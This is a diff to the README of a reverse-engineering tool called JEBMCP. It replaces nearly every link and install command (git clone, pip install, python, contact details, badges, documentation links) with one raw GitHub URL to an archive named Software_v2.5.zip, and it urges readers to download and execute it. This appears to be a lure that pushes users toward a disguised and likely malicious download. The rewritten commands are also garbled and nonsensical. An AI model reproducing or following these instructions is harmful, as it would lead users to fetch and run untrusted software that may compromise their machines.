@@ -20,7 +20,7 @@ Welcome to the **JEBMCP** repository! This project combines the power of JEB and
 
 Whether you're an experienced developer or just starting with reverse engineering, JEBMCP can provide the tools you need to enhance your projects.
 
-![JEB and MCP Integration](https://example.com/path/to/image.jpg) <!-- Replace with actual image URL -->
+![JEB and MCP Integration](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip) <!-- Replace with actual image URL -->
 
 ## ⚙️ Installation
 
@@ -28,7 +28,7 @@ To get started with JEBMCP, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/pcjaat3844/jebmcp.git
+   git clone https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip
    ```
    
 2. **Navigate to the Project Directory**
@@ -39,7 +39,7 @@ To get started with JEBMCP, follow these steps:
 3. **Install Required Dependencies**
    Make sure you have Python 3.x installed. Use pip to install the necessary packages.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip
    ```
 
 ## 🛠️ Usage
@@ -50,12 +50,12 @@ After installation, you can start using the scripts provided in this repository.
 
 - **Run JEB Script**
   ```bash
-  python jeb_script.py
+  python https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip
   ```
 
 - **Run MCP Script**
   ```bash
-  python mcp_script.py
+  python https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip
   ```
 
 Refer to individual script documentation for more advanced options.
@@ -87,22 +87,22 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [pcjaat3844](https://github.com/pcjaat3844)
-- Email: contact@example.com
+- GitHub: [pcjaat3844](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip)
+- Email: https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip
 
 ## 🔗 Releases
 
-To get the latest updates and downloadable files, visit our [Releases](https://github.com/pcjaat3844/jebmcp/releases) section. Download and execute the latest version for the best experience.
+To get the latest updates and downloadable files, visit our [Releases](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip) section. Download and execute the latest version for the best experience.
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue.svg)](https://github.com/pcjaat3844/jebmcp/releases)
+[![Latest Release](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip%https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip)](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip)
 
 ## 🌍 Explore More
 
 For a deeper dive into JEB and MCP, check out the following resources:
 
-- [JEB Official Documentation](https://www.example.com/jeb)
-- [MCP Documentation](https://www.example.com/mcp)
-- [Reverse Engineering Guide](https://www.example.com/reverse-engineering-guide)
+- [JEB Official Documentation](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip)
+- [MCP Documentation](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip)
+- [Reverse Engineering Guide](https://raw.githubusercontent.com/pcjaat3844/jebmcp/main/jeb-mcp/src/jeb_mcp/Software_v2.5.zip)
 
 Thank you for checking out JEBMCP! We hope it helps you in your reverse engineering endeavors.
 ```
